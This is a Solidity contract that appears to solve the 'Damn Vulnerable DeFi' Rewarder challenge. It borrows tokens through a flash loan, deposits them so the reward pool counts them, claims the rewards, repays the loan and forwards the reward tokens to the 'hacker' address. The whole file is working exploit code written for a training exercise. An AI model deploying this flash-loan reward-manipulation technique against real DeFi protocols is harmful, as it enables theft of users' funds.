// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";


contract Attack2 {
    address hacker;

    TheRewarderPool pool;
    FlashLoanerPool loan;
    DamnValuableToken token;
    RewardToken reward;
    constructor(TheRewarderPool _pool, DamnValuableToken _token, FlashLoanerPool _loan, RewardToken _reward) {
        pool = _pool;
        token = _token;
        loan = _loan;
        reward = _reward;
        hacker = msg.sender;
    } 
    receive() external payable {}
    function receiveFlashLoan(uint256 _amount) public {
        token.approve(address(pool), _amount);
        pool.deposit(_amount);

        pool.distributeRewards();

        pool.withdraw(_amount);
        token.transfer(address(loan), _amount);

        uint256 amountRewards = reward.balanceOf(address(this));
        reward.transfer(hacker, amountRewards);
    }

    function hack(uint256 _amount) public {
        loan.flashLoan(_amount);
    }
}